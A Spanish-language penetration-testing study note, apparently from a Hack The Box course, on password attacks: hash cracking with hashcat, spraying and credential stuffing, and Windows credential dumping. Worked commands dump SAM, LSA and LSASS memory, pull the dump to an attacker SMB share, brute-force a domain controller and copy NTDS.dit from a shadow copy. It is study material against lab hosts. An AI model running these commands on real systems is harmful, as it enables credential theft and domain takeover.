---
{"dg-publish":true,"permalink":"/penetration-tester-path/ataques-a-contrasenas/"}
---


## Introducción

`Confidencialidad`, `Integridad`, `Disponibilidad` están en el centro de responsabilidades de todo profesional de la seguridad de la información. Si no mantenemos un equilibrio entre ellos, no podemos garantizar la seguridad de nuestras empresas. Este equilibrio se conserva mediante la auditoría y la contabilidad de cada archivo, objeto y host en el entorno. La mayoría de las violaciones se remontan a la ruptura de uno de estos tres principios. Este módulo se centra en atacar y eludir el principio de `Autenticación` comprometiendo las contraseñas de los usuarios en varios sistemas operativos, aplicaciones y métodos de cifrado.

### Autenticación

La autenticación, en esencia, es la validación de su identidad mediante la presentación de una combinación de cuatro factores a un mecanismo de validación.

- `Algo que sabes`: una contraseña, código de acceso, PIN, etc.
- `Algo que tienes`: una tarjeta de identificación, una clave de seguridad u otras herramientas de MFA.
- `Algo que eres`: su yo físico, nombre de usuario, dirección de correo electrónico u otros identificadores
- `Somewhere you are`: geolocalización, dirección IP, etc.

### El uso de contraseñas

El método de autenticación más común y ampliamente utilizado sigue siendo el uso de contraseñas. Una contraseña o frase de contraseña se puede definir generalmente como `una combinación de letras, números y una cadena símbolos para una validación de identidad`. Por ejemplo, si trabajamos con contraseñas y tomamos una contraseña estándar de 8 dígitos que consta solo de letras mayúsculas y números.  

Ahora que sabemos esto, pasamos a una sección importante la cuál se es introducción al crackeo de contraseñas.

---
## Introducción al crackeo de contraseñas

Las contraseñas son comúnmente `hashed` cuando se almacenan, con el fin de proporcionar cierta protección en caso de que caigan en manos de un atacante. `Hashing` es una función matemática que transforma un número arbitrario de bytes de entrada en una salida (típicamente) de tamaño fijo; ejemplos comunes de funciones hash son `MD5` y `SHA-256`.

``` shell
bmdyy@htb:~$ echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa -
```

Las funciones hash están diseñadas para funcionar en `one direction`. Esto significa que no debería ser posible averiguar cuál era la contraseña original basándose únicamente en el hash. Cuando los atacantes intentan hacer esto, se llama `password cracking`. Las técnicas comunes son usar `rainbow tables`, para realizar `dictionary attacks` y, por lo general, como último recurso, para realizar `brute-force attacks`.

## Tablas Rainbow

Las tablas Rainbow son grandes mapas pre-compilados de valores de entrada y salida para una función hash determinada. Estos se pueden usar para identificar muy rápidamente la contraseña si ya se ha mapeado su hash correspondiente.

![Pasted image 20250617150609.png](/img/user/imgs/Pasted%20image%2020250617150609.png)

Debido a que las mesas Rainbow son un ataque tan poderoso, `salting` se utiliza. Un `salt`, en términos criptográficos, es una secuencia aleatoria de bytes agregados contraseña antes de que se le agregue un hash. Para maximizar el impacto, las sales no deben reutilizarse, por ejemplo, para todos las contraseñas almacenadas en una base de datos. Por ejemplo, si la sal `Th1sIsTh3s@lt_` se antepone a la misma contraseña, el hash MD5 ahora sería el siguiente:

![Pasted image 20250617151029.png](/img/user/imgs/Pasted%20image%2020250617151029.png)

Un Salt no es un valor secreto: cuando un sistema va a verificar una solicitud de autenticación, necesita saber qué sal se usó para poder verificar si el hash de la contraseña coincide. Por esta razón, las sales suelen ir precedidas de los hashes correspondientes. La razón por la que se esta técnica funciona con las tablas Rainbow es que incluso si se ha asignado contraseña correcta, es probable que la combinación de sal y contraseña no lo haya hecho (especialmente si la sal contiene caracteres no imprimibles).

---
## Ataque de fuerza bruta

Un `ataque de fuerza bruta` consiste en intentar las combinaciones posibles de letras, números y símbolos hasta que se descubra la contraseña correcta. Obviamente, esto puede llevar mucho tiempo, número y símbolos hasta que se descubra la contraseña correcta.

### Tipos de hash

Hashcat admite cientos de tipos de hash diferentes, a cada uno de los cuales se le asigna un ID. Se puede generar una lista de identificadores asociados ejecutando `hashcat` `--help`.

![Pasted image 20250617171052.png](/img/user/imgs/Pasted%20image%2020250617171052.png)

El sitio web de `hashcat` alberga una lista completa de [hashes de ejemplo](https://hashcat.net/wiki/doku.php?id=example_hashes) que pueden ayudar a identificar manualmente un tipo de hash desconocido y determinar el identificador de modo hash de Hashcat correspondiente.

Alternativamente, [hashID](https://github.com/psypanda/hashID) se puede usar para identificar rápidamente el tipo de hash hashcat especificando el `-m` argumento.

![Pasted image 20250617171846.png](/img/user/imgs/Pasted%20image%2020250617171846.png)

## Modos de ataque

Hashcat tiene muchos modos de ataque diferentes, que incluyen `diccionario`, `máscara`, `combinado`, `asociado`. En esta sección repasaremos los dos primeros, ya que probablemente sean los más comunes que necesitará usar.

##### Ataque de diccionario

Ataque de diccionario (`-a 0`), es cuando el usuario proporciona hashes de contraseña y una lista de palabras como entrada, y Hashcat prueba cada palabra de la lista como una contraseña potencial hasta que se encuentra la correcta o se agota la lista.

![Pasted image 20250617173735.png](/img/user/imgs/Pasted%20image%2020250617173735.png)

Una lista de palabras por sí sola a menudo no es suficiente para descifrar un hash de contraseña. Al igual que en el caso de JtR, `rules` Se puede utilizar para realizar modificaciones específicas en las contraseñas para generar aún más conjeturas. Los archivos de reglas que vienen con hashcat generalmente se encuentran en `/usr/share/hashcat/rules`:

![Pasted image 20250617174334.png](/img/user/imgs/Pasted%20image%2020250617174334.png)

![Pasted image 20250617174643.png](/img/user/imgs/Pasted%20image%2020250617174643.png)

## Ataque de máscara

Ataque de máscara (-a 3) es un tipo de ataque de fuerza bruta en el que el espacio de claves es definido explícitamente por el usuario. Por ejemplo, si sabemos que una contraseña tiene ocho caracteres, en lugar de intentar todas las combinaciones posibles, podríamos definir una máscara que pruebe combinaciones de seis letras seguidas de dos números.

![Pasted image 20250617175543.png](/img/user/imgs/Pasted%20image%2020250617175543.png)

---

## Escribiendo lista de palabras y reglas personalizadas

Muchos usuarios crean sus contraseñas basándose en `simplicidad en lugar de seguridad `, para ello, se pueden implementar políticas de contraseñas en los sistemas para hacer cumplir requisitos específicos de contraseñas. Por ejemplo, un sistema podría imponer la inclusión de letras mayúsculas, caracteres especiales y números.

Desafortunadamente, la tendencia de los usuarios a crear contraseñas débiles ocurre incluso cuando existen políticas de contraseñas. La mayoría de las personas siguen patrones predecibles al crear contraseñas, a menudo incorporando palabras estrechamente relacionadas con el servicio al que se accede. Por ejemplo, muchos empleados eligen contraseñas que incluyen el nombre de la empresa. Las preferencias e intereses personales también juegan un papel importante. Debido a que puede incluir información personal relacionadas a su vida cotidiana. Las técnicas básicas de OSINT (Open Source Intelligence) pueden ser muy eficaces para descubrir dicha información personal y pueden ayudar a adivinar las contraseñas.

![Pasted image 20250617182103.png](/img/user/imgs/Pasted%20image%2020250617182103.png)

---

![Pasted image 20250617182122.png](/img/user/imgs/Pasted%20image%2020250617182122.png)

Cada regla se escribe en una nueva línea y determina cómo se debe transformar una palabra. Si escribimos las funciones mostradas anteriormente en un archivo, puede verse así:

``` sh
MrBloody01@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```


# Generación de listas de palabras mediante CeWL

Podemos usar una herramienta llamada **CeWL** para escanear palabras potenciales del sitio web de una empresa y guardarlas en una lista de contraseñas personalizada, una que tenga una mayor probabilidad de contener la contraseña correcta de un empleado. Especificamos algunos parámetros, como la profundidad to spider (`-d`), la longitud mínima de la palabra (`-m`), el almacenamiento de las palabras encontradas en minúsculas (`--lowercase`), así como el fichero donde queremos almacenar los resultados (`-w`).

![Pasted image 20250617183101.png](/img/user/imgs/Pasted%20image%2020250617183101.png)


### Spraying, Stuffing, and Defaults

#### Password Spraying

El `password spraying` es un tipo de ataque de fuerza bruta en el que un atacante intenta usar una sola contraseña en muchas cuenta de usuario diferentes. Por ejemplo, si se sabe que los administradores de una empresa en particular suelen utilizar `ChangeMe123!` al configurar nuevas cuentas, valdría la pena rociar esta contraseña en todas las cuentas de `usuario` para identificar las que no se actualizaron.

![Pasted image 20250618170411.png](/img/user/imgs/Pasted%20image%2020250618170411.png)

##### Relleno de credenciales

Es otro tipo de ataque de fuerza bruta en el que un atacante utiliza credenciales robadas de un servicio para intentar acceder a otros. Dado que `muchos usuarios reutilizan sus nombres de usuario y passwords en múltiples plataformas` (como el email, las redes sociales y los sistemas empresariales). Por ejemplo, si tenemos una lista de `username:password` obtenidas de una fuga de base de datos, podemos usar `hydra` para realizar un ataque de relleno de credenciales contra un servicio SSH utilizando la siguiente sintaxis:

![Pasted image 20250618170817.png](/img/user/imgs/Pasted%20image%2020250618170817.png)

##### Credenciales default

Muchos sistemas, como enrutadores, firewalls y DB, vienen con `default credentials`. Si bien las mejores prácticas dictan que los administradores cambien estas credenciales durante la configuración, a veces se dejan sin cambios, lo que representa un grave riesgo de seguridad.

Hay varias listas de credenciales predeterminadas conocidas disponibles en internet, pero, también hay herramientas dedicadas que automatizan el proceso. Un ejemplo de ello es la [default credentials cheat sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) , que podemos instalar con `pip3`.

![Pasted image 20250618171514.png](/img/user/imgs/Pasted%20image%2020250618171514.png)

Una vez instalado, podemos usar el método `creds` para buscar credenciales predeterminadas conocidas asociadas con un producto o proveedor específico.

![Pasted image 20250618171756.png](/img/user/imgs/Pasted%20image%2020250618171756.png)

Imaginemos que hemos identificado ciertas aplicaciones en uso en la red de un cliente. Después de investigar las credenciales predeterminadas en línea, podemos combinarlas en una nueva lista, con el formato `username:password`, y reutilizar el anteriormente mencionado `hydra` para intentar acceder.

![Pasted image 20250618171923.png](/img/user/imgs/Pasted%20image%2020250618171923.png)

# Windows Authentication Process

El proceso de autenticación del cliente de Windows involucra múltiples módulos responsables del inicio de sesión, la recuperación de credenciales y la verificación. Entre los diversos mecanismos de autenticación de Windows, Kerberos es uno de los más utilizados y complejos.

- Diagrama del proceso de autenticación de Windows:
![Pasted image 20250629234153.png](/img/user/imgs/Pasted%20image%2020250629234153.png)

El inicio de sesión interactivo local se gestiona mediante la coordinación de varios componentes: el proceso de inicio de sesión (**WinLogon**), el proceso de interfaz de usuario de inicio de sesión (`LogonUI`), proveedores de credenciales, el (LSASS) y el SAM o Active Directory. Los paquetes de autenticación, en este contexto, son bibliotecas DLL.

![Pasted image 20250629235653.png](/img/user/imgs/Pasted%20image%2020250629235653.png)

**WinLogon** es el único proceso que intercepta las solicitudes de inicio de sesión desde el teclado, que se envían a través de mensajes RPC desde **Win32k.sysAl** iniciar sesión, se inicia inmediatamente el *LogonUIAplicación* para presentar la interfaz gráfica de usuario. Una vez que el proveedor de credenciales recopila las credenciales del usuario, WinLogon las envía al Servicio del Subsistema de Autoridad de Seguridad Local (SSA). LSASS) para autenticar al usuario. 



## LSASS

El Servicio del Subsistema de Autoridad de Seguridad Local ( **LSASS**) se compone de varios módulos y rige todos los procesos de autenticación. Ubicado en **%SystemRoot%\System32\Lsass.exeEn** el sistema de archivos, es responsable de aplicar la política de seguridad local, autenticar usuarios y enviar registros de auditoría de seguridad al `EventLog` en esencia.

![Pasted image 20250630000240.png](/img/user/imgs/Pasted%20image%2020250630000240.png)

### Base de datos SAM

Administrador de cuentas de seguridad (`SAM`) es un archivo de base de datos en sistemas operativos **Windows** que almacena credenciales de cuentas de usuario. Se utiliza  para autenticar usuarios locales y remotos y utiliza protección criptográfica para evadir el acceso no autorizado. Las contraseñas de usuario se almacenan como hashes en el registro, generalmente en forma de **HASHES LM o NTLM**. El archivo SAM se encuentra en **%SystemRoot%\system32\config\SAM**  y está montado debajo `HKML\SAM` para ver o acceder a este archivo se requiere privilegios de nivel *'SYSTEM'*

Para mejorar la protección contra el hackeo sin conexión de la base de datos SAM, Microsoft introdujo una función en *Windows NT 4.0* llamada `SYSKEY( syskey.exe)` Cuando está habilitado, SYSKEY encripta parcialmente el archivo SAM en el disco, garantizando que los hashes de contraseñas de todas las cuentas locales estén encriptados con una clave generada por el sistema. 

- Credential Manager:
![Pasted image 20250630001222.png](/img/user/imgs/Pasted%20image%2020250630001222.png)


El Administrador de Credenciales es una función integrada en todos los sistemas operativos Windows que permite a los usuarios almacenar y administrar las credenciales utilizadas para acceder a recursos de red, sitios web y aplicaciones. Estas credenciales se guardan por perfil de usuario en la carpeta de usuario. `Credential Locker`, las credenciales se cifran y se almacenan en la siguiente ubicación: 

![Pasted image 20250630001340.png](/img/user/imgs/Pasted%20image%2020250630001340.png)

Existen varios métodos para descifrar las credenciales guardadas con Credential Manager. En este módulo, practicaremos con algunos de estos métodos.

##### NTDS:

Es muy común encontrar entornos de red donde los sistemas Windows están unidos a un dominio de Windows. Esta configuración simplifica la administración centralizada, permitiendo a los administradores supervisar eficientemente todos los sistemas de su organización. En estos entornos, las solicitudes de inicio de sesión se envían a los controladores de dominio dentro del mismo bosque de Active Directory.

![Pasted image 20250630001458.png](/img/user/imgs/Pasted%20image%2020250630001458.png)

# Attacking SAM, System, and SECURITY

Con acceso administrativo a un sistema Windows, podemos intentar volcar rápidamente los archivos asociados a la base de datos SAM, transferirlos a nuestro host de ataque y comenzar a descifrar los hashes sin conexión. Realizar este proceso sin conexión nos permite continuar nuestros ataques sin necesidad de mantener una sesión activa con el objetivo. Analicemos este proceso juntos usando un host de destino. Siéntete libre de seguir las instrucciones generando el cuadro de destino que se proporciona en esta sección.

![Pasted image 20250630011151.png](/img/user/imgs/Pasted%20image%2020250630011151.png)

Podemos hacer una copia de seguridad de estas colmenas utilizando el `reg.exe` utilidad. 

#### Uso de reg.exe para copiar subárboles del registro

Con el lanzamiento `cmd.exe` con privilegios administrativos, podemos utilizar `reg.exe`, para guardar copias de las secciones del registro, ejecute los siguientes comandos: 

``` javascript

C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

### Dumping LSA secrets remotely

``` sh
MrBloody@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

#### Dumping SAM Remotely

``` sh
MrBloody@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```


#### How to find the LSASS PID in PowerShell

Podemos hacerlo desde la Powershell, emitimos el comando `'Get-Process LSASS'` y podremos ver el ID del proceso en el campo `ID`. 

``` css
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
1260      21        4948      15396      2.56     672  0    lsass
```

Luego de que tengamos el PID asignado podemos crear un archivo de volcado.


## Creating a dump file using PowerShell

Con una sesión de PowerShell elevada, podemos emitir el siguiente comando para crear un archivo de volcado: 

``` css
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Con este comando estamos ejecutando **rundll32.exe** para llamar a una función exportada de **comsvcs.dllque** también llama al MiniDumpWriteDump (**MiniDump**) función para volcar la memoria del proceso LSASS a un directorio especificado (**C:\lsass.dmp**)


> ==Nota:== Podemos utilizar el método de transferencia de archivos analizado en la sección Atacar SAM para obtener el archivo *lsass.dmp* desde el objetivo a nuestro host de ataque. 


Uso de recurso compartido SMB para enviarnos el lsass a nuestro host atacante
``` css
impacket-smbserver -smb2support CompData /home/kali/Desktop/HackTheBox/Labs
```

### Using Pypykatz to extract credentials

Una vez que tenemos el archivo de volcado en nuestro host de ataque, podemos usar una poderosa herramienta llamada *pypykatz* para extraer credenciales del archivo ``.dmp`` 


##### Que mierda es Pypykatz?

*Pypykatz* es una implementación de **Mimikatz** escrita completamente en Python. Su uso en Python permite ejecutarlo en hosts de ataque basados ​​en Linux. Actualmente, **Mimikatz** solo funciona en sistemas Windows, por lo que para usarlo, necesitaríamos usar un host de ataque de Windows o ejecutarlo directamente en el objetivo, lo cual no es ideal. Esto convierte a *Pypykatz* en una alternativa atractiva, ya que solo necesitamos una copia del archivo de volcado y podemos ejecutarlo sin conexión desde nuestro host de ataque basado en Linux.


#### Running Pypykatz:

``` css
MrBloody@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

# Kerberos

``` css
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

*Kerberos* es un protocolo de autenticación de red utilizado por **Active Directory** en entornos de dominio de Windows. A las cuentas de usuario de dominio se les asignan tickets tras la autenticación con **Active Directory**.


# DPAPI

`Mimikatz` y `Pypykatz` pueden extraer el `DPAPI` masterkey para usuarios conectados cuyos datos se encuentran en la memoria del proceso LSASS. Estas claves maestras pueden usarse para descifrar los secretos asociados a cada aplicación mediante DPAPI, lo que permite la captura de credenciales para diversas cuentas.


### Descifrando el hash NT con Hashcat

``` css
MrBloody@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```


![Pasted image 20250630235336.png](/img/user/imgs/Pasted%20image%2020250630235336.png)



![Pasted image 20250701005646.png](/img/user/imgs/Pasted%20image%2020250701005646.png)


``` css
# Opción 1: Con Invoke-WebRequest (PowerShell)
Invoke-WebRequest -Uri "http://<IP_Linux>:8000/archivo.txt" -OutFile "C:\ruta\destino\archivo.txt"

# Opción 2: Con wget (si está instalado en Windows)
wget http://<IP_Linux>:8000/archivo.txt -OutFile "C:\ruta\destino\archivo.txt"

# Opción 3: Con certutil (CMD clásico)
certutil -urlcache -split -f "http://<IP_Linux>:8000/archivo.txt" "C:\ruta\destino\archivo.txt"
```

#file-transfer 

---
# Attacking Active Directory and NDTDS.dit

`Active Directory (AD)` es un servicio de directorio común y crítico en las redes empresariales modernas. AD es algo que encontraremos con frecuencia, por lo que debemos familiarizarnos con los diversos métodos que podemos usar para atacar y defender estos entornos.
``se usa para administrar esos sistemas Windows``. 

En esta sección, nos centraremos principalmente en cómo podemos extraer credenciales mediante el uso de un `dictionary attack` contra `AD accounts` y `dumping hashes` desde el **NTDS.dit** archivo. 


Existen situaciones en las que una organización podría estar utilizando el reenvío de puertos para reenviar el protocolo de escritorio remoto (*3389*) u otros protocolos utilizados para el acceso remoto desde su enrutador perimetral a un sistema de su red interna.

![Pasted image 20250701131806.png](/img/user/imgs/Pasted%20image%2020250701131806.png)

Alguien que desee iniciar sesión con una cuenta local en la base de datos SAM aún puede hacerlo especificando... ``hostname`` del dispositivo precedido por el ``Username`` (**Ejemplo: WS01\nameofuser**)


### Dictionary attacks against AD accounts using NetExec

Tenga en cuenta que un ataque de diccionario consiste básicamente en usar el poder de una computadora para adivinar un nombre de usuario o una contraseña usando una lista personalizada de posibles nombres de usuario y contraseñas. 

![Pasted image 20250701132237.png](/img/user/imgs/Pasted%20image%2020250701132237.png)


> [!NOTE] Nota:
>  A menudo, la estructura de una dirección de correo electrónico nos dará el nombre de usuario del empleado (estructura: *username@domain*). Por ejemplo, desde la dirección de correo electrónico **jdoe@ inlanefreight.com**, podemos inferir que *jdoe* es el nombre de usuario. 



Podemos crear nuestras listas manualmente o utilizar un `automated list generator` como la herramienta basada en `Ruby Username Anarchy`


### Enumerating valid usernames with Kerbrute

Antes de empezar a adivinar contraseñas para nombres de usuario que podrían no existir, conviene identificar la convención de nomenclatura correcta y confirmar la validez de algunos nombres de usuario.

Podemos hacerlo con una herramienta como **Kerbrute**. Kerbrute puede utilizarse para ataques de fuerza bruta, spray de contraseñas y *enumeración* de nombres de usuario. Por ahora solo usaremos kerbrute para enumeración.

``` c
MrBloody@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@inlanefreight.local
<SNIP>
```

## Launching a brute force attack with NetExec

Una vez que tengamos nuestras listas preparadas o hayamos descubierto la convención de nomenclatura y los nombres de algunos empleados, podemos lanzar un ataque de fuerza bruta contra el controlador de dominio objetivo usando una herramienta como *NetExec*. Podemos usarla junto con el protocolo SMB para enviar solicitudes de inicio de sesión al controlador de dominio objetivo. 

Este es el comando para hacerlo:

``` css
MrBloody@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```


#### Registro de evento del ataque

![Pasted image 20250701143710.png](/img/user/imgs/Pasted%20image%2020250701143710.png)

Puede ser útil saber qué podría haber dejado un ataque. Conocerlo puede hacer que nuestras recomendaciones de remediación sean más impactantes y valiosas para el cliente con el que trabajamos. En cualquier sistema operativo Windows, un administrador puede navegar a `EventViewer` y ver los eventos de seguridad para ver las acciones exactas registradas

## NTDS.dit capture

``NT Directory Services (NTDS)`` es el servicio de directorio que se utiliza con AD para buscar y organizar recursos de red. Recordar que el archivo *NTDS.dit* se almacena en `%systemroot%/ntds` en los controladores de dominio del `forest`. El **.dit** significa *'árbol de información de directorio'*

Este es el archivo de base de datos principal asociado con **AD** y almacena todos los **nombres de usuario del dominio**, **hashes de contraseñas** y otra información crítica del esquema. 

Si se logra capturar este archivo, podríamos comprometer todas las cuentas del dominio, de forma similar a la técnica que vimos en este módulo.




##### Comprobación de la membresía del grupo local

Una vez conectado, podemos comprobar qué privilegios tenemos ``bwilliamson`` tiene. 

Podemos empezar por revisar la membresía del grupo local usando el comando: 

``` css
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```


## Creating a shadow copy of C:

Podemos usar ``vssadmin`` para crear una instantánea de volumen ``(VSS)`` del ``C:`` o el volumen que el administrador eligió al instalar AD inicialmente.


``` python
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```


### Copy NTDS.dit from the VSS

Luego podemos copiar el ``NTDS.dit``  de la copia de sombra del volumen de ``C:`` en otra ubicación en la unidad para preparar el traslado de ``NTDS.dit`` a nuestro host de ataque. 

``` python
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Antes de copiar ``NTDS.dit`` para nuestro host de ataque, podemos usar la técnica que aprendimos antes para crear un recurso compartido SMB en nuestro host de ataque. Puedes volver a la sección **Attacking SAM, SYSTEM, and SECURITY** sección para revisar ese método si es necesario. 


> [!NOTE] **Nota:**
